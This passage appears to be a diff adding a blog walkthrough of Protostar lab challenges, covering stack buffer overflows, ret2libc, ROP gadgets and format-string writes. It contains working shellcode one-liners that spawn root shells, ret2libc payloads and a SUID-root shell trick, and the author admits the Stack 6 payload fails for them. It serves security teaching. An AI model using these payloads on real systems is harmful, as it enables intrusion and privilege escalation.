+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">68/tty</span><span class="se">\x</span><span class="s2">68/dev</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">27</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68//sh</span><span class="se">\x</span><span class="s2">68/bin</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80' + '0' * 21 + '</span><span class="se">\x</span><span class="s2">BF</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span> | ./stack5
+</code></pre></div>    </div>
+  </li>
+  <li>If we pipe all of that into stack5, we expect to receive a shell back, but instead we get a segmentation fault. The reason is that in our shellcode we have a bunch of push instructions that when executed will put things on the stack basically overwriting instructions already there.</li>
+  <li>To prevent that, we have to ensure that $esp is pointing to a proper location to not interfere with our code when stuff is pushed into the stack. What we can do is moving the register back so that it will leave enough space for all the pushes in our code. The instruction can be like <code class="language-plaintext highlighter-rouge">add $0x10, $esp</code>, which translates to opcode \x83\xc4\x10.</li>
+  <li>We prepend this to our code, obtaining
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">68/tty</span><span class="se">\x</span><span class="s2">68/dev</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">27</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68//sh</span><span class="se">\x</span><span class="s2">68/bin</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80' + '0' * 18 + '</span><span class="se">\x</span><span class="s2">BF</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span> | ./stack5
+</code></pre></div>    </div>
+  </li>
+  <li>Running this code clearly returns a shell that is root (you can check it with the command whoami).</li>
+</ol>
+
+<h3 id="stack06">[Stack06]</h3>
+<p>Now there are restrictions on the return address.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">getpath</span><span class="p">(){</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"input path please: "</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+
+    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">((</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xbf000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xbf000000</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"bzzzt (%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
+        <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"got path %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="n">getpath</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>return-to-libc: this attack usually uses a buffer overflow to replace a return address so that it points to another routine already in memory (meaning taken from a library), so the attacker doesn’t need to inject its own code. These target library is usualy libc, because it is almost always linked and contains functions like system that can be used to execute shell commands. Check out a great explanation in Performing a ret2libc Attack by InVoLuNTaRy</p>
+</blockquote>
+
+<blockquote>
+  <p>C calling convention: arguments of the function are pushed on the stack, in right-to-left order (meaning that last argument is pushed first). Integers and addresses are returned in the EAX register; registers EAX, ECX, and EDX are caller-saved, and the rest are callee-saved.</p>
+</blockquote>
+
+<ol>
+  <li>The approach to exploit this code could be the same as in the last challenge, but there is an additional trick: we can’t modify the $eip to an instruction in the stack, because the <code class="language-plaintext highlighter-rouge">(ret &amp; 0xbf000000) == 0xbf000000</code> makes sure that addresses in the stack will not be accepted as return addresses. We know that the stack is in that address space thanks to <code class="language-plaintext highlighter-rouge">gdb &gt; info proc map</code></li>
+  <li>By running <code class="language-plaintext highlighter-rouge">gdb &gt; disas getpath</code> we can look into the assembly code of the <code class="language-plaintext highlighter-rouge">getpath</code> method. We see right before the call to the gets instruction that the buffer is loaded from <code class="language-plaintext highlighter-rouge">$ebp-0x4C</code>. We can not look for a gadget to jump to $eax, because $eax is changed multiple times during the execution. However the same location is loaded into $edx right before returning, and so finding a jump to that register could be a solution. But using <code class="language-plaintext highlighter-rouge">msfelfscan</code> doesn’t return any useful gadget.</li>
+  <li>Therefore we try to approach the problem with a <code class="language-plaintext highlighter-rouge">ret2libc</code> attack. We want to invoke the system function, pass the proper command to be executed to it, and make it properly return to the exit function.</li>
+  <li>To locate system and exit in the library loaded by stack6, we can launch stack6 with gdb and use <code class="language-plaintext highlighter-rouge">gdb &gt; print system</code> and <code class="language-plaintext highlighter-rouge">gdb &gt; print exit</code>. This tells us that system is located at address 0xb7ecffb0, and exit at 0xb7ec60c0.</li>
+  <li>Our call to system should result to spawning a shell, and to do this we need to pass a pointer to a string containing the “/bin/sh” command to be executed. We could find this string in different locations: the first one that comes to mind might be the buffer itself. The only problem in this case is that we should pass the pointer to the start of the buffer, and that is not a fixed value.</li>
+  <li>As alternative, we look at environment variables: when a program is launched, the variables are put at the end of the stack, and they have a static address. We can either define our own variable, with <code class="language-plaintext highlighter-rouge">export PWN=/bin/sh</code>, or look if a variable pointing to the shell already exists.</li>
+  <li>To get the address of the variable, we can start gdb, reach a breakpoint in stack6 and run <code class="language-plaintext highlighter-rouge">gdb &gt; x/10s *((char **)environ)</code>, changing the amount of shown variables until we find the one we are interested in.</li>
+  <li>In our case, we have an existing <code class="language-plaintext highlighter-rouge">SHELL</code> variable located at 0xbffff8a9. To note is that we are only interested in the actual content of the variable, but in memory it is stored as a single string of the form <code class="language-plaintext highlighter-rouge">VARNAME=xxxxxxxx</code>. This means that to our address we have to add a little offset to leave out the name: “SHELL=” has 6 characters, so we add 6 to the address, obtaining 0xbffff8af</li>
+  <li>Our payload will have the following structure:
+    <ul>
+      <li>Buffer filler (80 bytes)</li>
+      <li>Pointer to system to overwrite $eip</li>
+      <li>Pointer to exit as the address to which system should jump when returning</li>
+      <li>Pointer to the content of SHELL as system argument</li>
+      <li>Whatever as exit argument</li>
+    </ul>
+  </li>
+  <li>
+    <p>This is the result:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s2">"print 'A' * 80 + '</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">b7' + '</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">b7' + '</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">bf' + '</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff'"</span> | ./stack6
+</code></pre></div>    </div>
+  </li>
+  <li>Executing the previous command should result in a root shell. However, on my system it does not work. Might be the pointers slightly off, or something else. Honestly, I’ve no idea.</li>
+</ol>
+
+<p>A nice addition to this challenge is to make system give root permissions to whatever we want. This is not my idea, but sadly I can’t find the source anymore. The approach is the same as the rest of the challenge, we just change the command that we pass to system. A nice example is writing a small C program that calls a shell with the SUID bit set:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
+        <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
+
+        <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+        <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
+
+        <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+        <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+
+        <span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>We then compile the file and create an environment variable that will change the owner and the permissions of the binary: <code class="language-plaintext highlighter-rouge">export SUID="/bin/chown root:root /home/user/shell; /bin/chmod 4755 /home/user/shell"</code>. With the approach explained in the previous steps we retrieve the pointer to the string command, and we pass that as argument to system. After running properly, our binary file should have root owner and SUID set, and running it will result in a root shell.</p>
+
+<h3 id="stack-07">[Stack 07]</h3>
+<p>Looking through the disassembled program for specific instructions.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="o">*</span><span class="nf">getpath</span><span class="p">(){</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"input path please: "</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+
+    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">((</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xb0000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xb0000000</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"bzzzt (%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
+        <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"got path %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="n">getpath</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>ROP chains: taking control of the call stack in a program, it is possible to make calls to specific sequences of instructions (called gadgets) alredy present in the code, that usually end with a return so that the following instruction might also be a call to another gadget. Chaining gadgets together it is possible to perform arbitrary operations on a machine.</p>
+</blockquote>
+
+<ol>
+  <li>This level has the same setup as the previous one, but the non-executable part of the stack is much larger, causing our pool of possible return addresses to get much smaller. We will therefore try to use the same approach as in Stack 5, by finding a gadget that will allow us to jump at the proper place.</li>
+  <li>If we do a disassemble with <code class="language-plaintext highlighter-rouge">gdb &gt; disas getpath</code> we can see that our buffer is stored at <code class="language-plaintext highlighter-rouge">$ebp-0x4c</code>, and that this address is loaded into $eax just before the method returns. This means that the value in $eax will still be there when we will be looking at the return address, meaning we could aim at returning exactly at that specific address.</li>
+  <li>To find a way to jump to $eax we look for possible gadgets in our code. To do that we execute <code class="language-plaintext highlighter-rouge">msfelfscan -f ~/stack7 -j eax</code>, meaning that we are looking in stack7 for code that jumps to $eax, being it a call, a return or whatever else would result in reaching that address. The script tells us that at address 0x080484bf there is a call to $eax that does exactly what we need</li>
+  <li>
+    <p>With the usual service we check how many bytes we have to fill to go from the buffer to $eip, and the result is 80. We build our payload with the same shellcode we already used, then pad it with 25 bytes to reach the position of $eip, and as last element we give the address of our gadget:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80' + '</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">68/tty</span><span class="se">\x</span><span class="s2">68/dev</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">27</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80' + '</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68//sh</span><span class="se">\x</span><span class="s2">68/bin</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80' + 'A' * 25 + '</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span> | ./stack7
+</code></pre></div>    </div>
+  </li>
+  <li>Upon executing this, we will be rewarded with a root shell.</li>
+</ol>
+
+<h3 id="format-00">[Format 00]</h3>
+<p>String supplied directly to printing functions can contain malicious formatting</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">){</span>
+    <span class="k">volatile</span> <span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+
+    <span class="n">target</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">sprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">string</span><span class="p">);</span>
+    
+    <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"you have hit the target correctly :)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ol>
+  <li>
+    <p>This task can be solved with a simple overflow: fill the buffer with whatever, put the expected value in the bytes that will act as overflow and overwrite the target variable. Remember that the system is little endian and therefore the bytes have to be passed “backwards”. Also, the string has to be passed as parameter, and not piped into stdin.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./format0 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print 'A' * 64 + '</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">de'"</span><span class="sb">`</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="format-01">[Format 01]</h3>
+<p>Modify arbitrary memory locations</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">){</span>
+    <span class="n">printf</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
+    
+    <span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"you have modified the target :)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Format Strings: this string contains both text and format parameters, that are pushed on the stack and popped by the calling function. This function retrieves first the format string itself, and while parsing it pops the other values from the stack and treats them as defined by the format. Following formats are the most popular: %d for int, %u for uint, %s for *char.
+Interesting formats are %x for hex and %n for numbers of bytes written so far: with the first one it is possible to force the popping of values from the stack, because the string parsing does not know that what is being popped is not a legitimate parameter; combining this with the second one it is possible to force writing on a specific address, just by popping until that address is on the top of the stack and then invoking %n so that it will write its result there.</p>
+</blockquote>
+
+<ol>
+  <li>The first thing that we need to do is to find out where target is, so that we know which at address we have to write. To do this we can use <code class="language-plaintext highlighter-rouge">objdump -t format1 | grep target</code>, which will tell us that the variable is stored at address 0x08049638</li>
+  <li>The goal is to use this address as parameter for a %n operation: to make this work we need to crawl along the stack and pop all that we find until that address is on the top.</li>
+  <li>
+    <p>To find out how many 4-bytes blocks we have to pop, we do some bruteforcing: we spam format1 with an input that is easy to recognize, like ‘AAAA’ (that corresponds to 41414141 in ASCII hex), and we pop a big number of blocks by appending a bunch of ‘%x’ to the string:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./format1 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print 'AAAA' + '%x' * 150"</span><span class="sb">`</span>
+</code></pre></div>    </div>
+  </li>
+  <li>The result is an ugly bunch of numbers, corresponding to the content of the stack. If we look at it with a bit of attention, we can identify the 41414141, towards the end. We repeat the spamming decreasing the number of ‘%x’ that we print, until the recognizable pattern is at the last 4 bytes that we pop. In this case, 142 is the perfect number.</li>
+  <li>While decreasing the number of pops that we do, there are alignment problems that might arise. We need to be able to control exactly the last 4 bytes, so it might be needed to modify a bit our recognizable patters, like ‘AABBCCDD’, so that even if the alignment is not perfect we should be able to identify 4 consecutive byte shat we can take control of.</li>
+  <li>
+    <p>When we have the 4 bytes under control, we change them: instead of our known pattern, we put there the address of target that we retrieved earlier. As we are using python, hex values are written with backslash and x, and we have to keep an eye on the endianness:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./format1 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%x' * 142"</span><span class="sb">`</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>The last step is to have something written to that address: to do this we swap the last ‘%x’ with a ‘%n’, so that the address will be popped and used as a pointer to write the amount of bytes that have been written until now. The challenge is solved.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./format1 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%x' * 141 + '%n'"</span><span class="sb">`</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="format-02">[Format 02]</h3>
+<p>Write specific values in memory</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(){</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+
+    <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+    
+    <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"you have modified the target :)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"target is %d :(</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">target</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="n">vuln</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Counting format strings: by providing a number between the percentage and the letter, the resulting format string will write that amount of elements. This means that it is possible to control what is written by %n: for example by using %Xu%n the result will be %n writing exactly value X because that’s the amount of bytes that have been outputted.</p>
+</blockquote>
+
+<ol>
+  <li>The challenge is similar to the previous one, but this time we have to write a specific value into target, and not just a random one. Again, we start using <code class="language-plaintext highlighter-rouge">objdump -t format2 | grep target</code> to find out that target is at address 0x080496e4</li>
+  <li>
+    <p>Time to spam format2 to find out how many pops we have to do to get the target address at the right place at the top of the stack:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print 'AAAA' + '%x'*20"</span> <span class="o">&gt;</span> /tmp/format2.in
+ ./format2 &lt; /tmp/format2.in
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>This time, turns out that we are looking really close, as the right amount of pops is 4. We swap our pattern with the target address, we remove a pop and instead put a ‘%n’ in there.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%x%x%x' + '%n'"</span> <span class="o">&gt;</span> /tmp/format2.in
+ ./format2 &lt; /tmp/format2.in
+</code></pre></div>    </div>
+  </li>
+  <li>This time we should see that a new value has been written to our target: the target has the value 23. Now it’s just a matter to convince the system to print more bytes without popping more stuff from the stack.</li>
+  <li>
+    <p>To do that we make one of our ‘%x’ pad its popped value with the amount of bytes we are missing. It might be necessary to try different values until we find the correct amount of padding (remember that target is a hex value).</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%44x%x%x' + '%n'"</span> <span class="o">&gt;</span> /tmp/format2.in
+ ./format2 &lt; /tmp/format2.in
+</code></pre></div>    </div>
+  </li>
+  <li>As soon as we get the correct amount of bytes printed out, target will be modified to contain the value 64 and allowing us to finish the challenge.</li>
+</ol>
+
+<h3 id="format-03">[Format 03]</h3>
+<p>Control what data is being written to the process memory.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">printbuffer</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">){</span>
+    <span class="n">printf</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+
+    <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+
+    <span class="n">printbuffer</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+    
+    <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mh">0x01025544</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"you have modified the target :)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"target is %08x :(</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">target</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
